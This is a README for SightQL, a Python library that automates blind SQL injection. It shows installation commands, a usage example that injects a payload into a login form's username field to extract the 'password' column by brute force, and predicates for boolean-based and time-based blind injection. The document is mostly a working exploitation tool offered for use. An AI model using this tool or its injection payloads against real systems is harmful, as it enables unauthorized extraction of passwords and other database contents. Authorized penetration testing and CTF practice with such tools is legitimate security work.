# SightQL

## Description

SightQL is a Python library which allows to exploit an SQL Injection using multiple entrypoints such as classical GET/POST parameters and cookies.

## Installation

```
git clone https://github.com/Ruulian/SightQL.git
cd SightQL
python3 setup.py install
```

## Usage

```py
from sightql import SightQL

def predicate(r) -> bool:
    """
    r : requests.models.Response

    The predicates must take a "requests" response and return a bool
    """
    return "Welcome back" in r.text

s = SightQL(
    target="http://localhost",
    params={
        "username":"admin' and {payload} -- -",
        "password":"foo"
    },
    column_to_exfil="password",
    predicate=predicate
)

s.restore()

```

The library will replace all the ``{payload}`` strings in your params/cookies keys and bruteforce all the characters.

### Predicate examples

Blind SQL Injection in login form:
```py
def predicate(r):
    return "Welcome back" in r.text
```

Blind SQL Injection Time Based:
```py
SLEEP_SECONDS = 5

def predicate(r):
    return r.elapsed.seconds > SLEEP_SECONDS
```

## TODO

- Add on PyPI